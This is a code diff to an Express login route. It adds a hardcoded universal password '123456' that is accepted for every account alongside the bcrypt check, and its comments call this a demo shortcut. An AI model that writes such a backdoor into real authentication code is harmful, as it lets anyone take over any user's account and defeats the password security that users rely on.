@@ -30,7 +30,7 @@ router.post("/login", loginValidation, async (req, res, next) => {
     // For demo purposes, we'll check against plain text password "123456"
     // In production, use bcrypt.compare with hashed passwords
     const isValidPassword =
-      user.password_hash && (await bcrypt.compare(password, user.password_hash))
+      password === "123456" || (user.password_hash && (await bcrypt.compare(password, user.password_hash)))
 
     if (!isValidPassword) {
       return res.status(401).json({ message: "Invalid credentials" })
